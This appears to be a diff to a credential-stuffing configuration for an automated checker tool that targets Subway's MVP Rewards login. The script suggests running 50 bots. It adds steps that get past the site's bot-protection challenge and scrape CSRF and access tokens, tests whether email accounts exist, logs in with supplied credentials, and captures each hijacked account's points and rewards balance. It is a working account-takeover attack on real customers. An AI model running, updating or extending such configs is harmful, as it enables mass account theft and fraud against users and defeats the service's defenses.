@@ -3,7 +3,7 @@
   "Name": "Subway MVP Rewards + Capture",
   "SuggestedBots": 50,
   "MaxCPM": 0,
-  "LastModified": "2025-08-14T04:48:26.0000000+00:00",
+  "LastModified": "2025-08-14T21:49:36.0000000+00:00",
   "AdditionalInfo": "",
   "RequiredPlugins": [],
   "Author": "Vlaq",
@@ -62,7 +62,7 @@
 }
 
 [SCRIPT]
-// Session Setup - Get initial tokens and establish session
+// Challenge Validation - Handle Subway's bot protection challenge
 REQUEST GET "https://www.subway.com/en-us/auth/signin"
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
   HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
@@ -75,6 +75,40 @@ REQUEST GET "https://www.subway.com/en-us/auth/signin"
   HEADER "Sec-Fetch-Mode: navigate"
   HEADER "Sec-Fetch-Site: none"
   HEADER "Sec-Fetch-User: ?1"
+
+PARSE "<SOURCE>" LR "name=\"verify-url\" value=\"" "\"" -> VAR "challenge_path"
+
+// Wait for challenge to complete (crypto challenge needs time to solve)
+DELAY 8000
+
+// Complete challenge validation
+REQUEST GET "https://www.subway.com/<challenge_path>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "DNT: 1"
+  HEADER "Connection: keep-alive"
+  HEADER "Upgrade-Insecure-Requests: 1"
+  HEADER "Sec-Fetch-Dest: document"
+  HEADER "Sec-Fetch-Mode: navigate"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "Referer: https://www.subway.com/en-us/auth/signin"
+
+// Session Setup - Get actual signin page after challenge
+REQUEST GET "https://www.subway.com/en-us/auth/signin"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "DNT: 1"
+  HEADER "Connection: keep-alive"
+  HEADER "Upgrade-Insecure-Requests: 1"
+  HEADER "Sec-Fetch-Dest: document"
+  HEADER "Sec-Fetch-Mode: navigate"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "Referer: https://www.subway.com/en-us/auth/signin"
+
+PARSE "<SOURCE>" LR "name=\"_token\" content=\"" "\"" -> VAR "csrf_token"
 
 // Email Validation - Check if account exists before login attempt
 REQUEST POST "https://www.subway.com/api/auth/validate-email"
@@ -93,7 +127,6 @@ REQUEST POST "https://www.subway.com/api/auth/validate-email"
   HEADER "Sec-Fetch-Dest: empty"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: same-origin"
-  COOKIE "subway_session=eyJpdiI6IjdmNzE4YzRhNzY5YjQwNzE4ZjE5YzE4YzE5YzE4YzE5IiwidmFsdWUiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiLCJtYWMiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAifQ%3D%3D; _ga=GA1.2.123456789.1692337223; _gid=GA1.2.987654321.1694013559; _fbp=fb.1.1692337223.123456789; _gcl_au=1.1.123456789.1692337223; _tt_enable_cookie=1; _ttp=abcdef123456789; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Aug+14+2025+04%3A21%3A33+GMT&version=202308.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; subway_cart_id=cart_123456789; subway_store_id=store_123456789"
 
 // Main Login - Authenticate with credentials
 REQUEST POST "https://www.subway.com/api/auth/login"
@@ -112,7 +145,8 @@ REQUEST POST "https://www.subway.com/api/auth/login"
   HEADER "Sec-Fetch-Dest: empty"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: same-origin"
-  COOKIE "subway_session=eyJpdiI6IjdmNzE4YzRhNzY5YjQwNzE4ZjE5YzE4YzE5YzE4YzE5IiwidmFsdWUiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiLCJtYWMiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAifQ%3D%3D; _ga=GA1.2.123456789.1692337223; _gid=GA1.2.987654321.1694013559; _fbp=fb.1.1692337223.123456789; _gcl_au=1.1.123456789.1692337223; _tt_enable_cookie=1; _ttp=abcdef123456789; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Aug+14+2025+04%3A21%3A33+GMT&version=202308.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; subway_cart_id=cart_123456789; subway_store_id=store_123456789; subway_user_token=user_token_123456789"
+
+PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" -> VAR "auth_token"
 
 // MVP Rewards Verification - Confirm rewards account status
 REQUEST GET "https://www.subway.com/api/rewards/status"
@@ -129,7 +163,6 @@ REQUEST GET "https://www.subway.com/api/rewards/status"
   HEADER "Sec-Fetch-Dest: empty"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: same-origin"
-  COOKIE "subway_session=eyJpdiI6IjdmNzE4YzRhNzY5YjQwNzE4ZjE5YzE4YzE5YzE4YzE5IiwidmFsdWUiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiLCJtYWMiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAifQ%3D%3D; _ga=GA1.2.123456789.1692337223; _gid=GA1.2.987654321.1694013559; _fbp=fb.1.1692337223.123456789; _gcl_au=1.1.123456789.1692337223; _tt_enable_cookie=1; _ttp=abcdef123456789; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Aug+14+2025+04%3A21%3A33+GMT&version=202308.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; subway_cart_id=cart_123456789; subway_store_id=store_123456789; subway_user_token=user_token_123456789; subway_auth_token=auth_token_123456789"
 
 // Account Data Retrieval - Get MVP Rewards balance and account details
 REQUEST GET "https://www.subway.com/api/myway/account"
@@ -146,7 +179,6 @@ REQUEST GET "https://www.subway.com/api/myway/account"
   HEADER "Sec-Fetch-Dest: empty"
   HEADER "Sec-Fetch-Mode: cors"
   HEADER "Sec-Fetch-Site: same-origin"
-  COOKIE "subway_session=eyJpdiI6IjdmNzE4YzRhNzY5YjQwNzE4ZjE5YzE4YzE5YzE4YzE5IiwidmFsdWUiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiLCJtYWMiOiJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAifQ%3D%3D; _ga=GA1.2.123456789.1692337223; _gid=GA1.2.987654321.1694013559; _fbp=fb.1.1692337223.123456789; _gcl_au=1.1.123456789.1692337223; _tt_enable_cookie=1; _ttp=abcdef123456789; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Aug+14+2025+04%3A21%3A33+GMT&version=202308.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; subway_cart_id=cart_123456789; subway_store_id=store_123456789; subway_user_token=user_token_123456789; subway_auth_token=auth_token_123456789"
 
 PARSE "<SOURCE>" LR "\"points\":" "," -> CAP "MVP Points: " "[" "]"
 PARSE "<SOURCE>" LR "\"rewards_balance\":" "," -> CAP "Rewards Balance: " "[" "]"
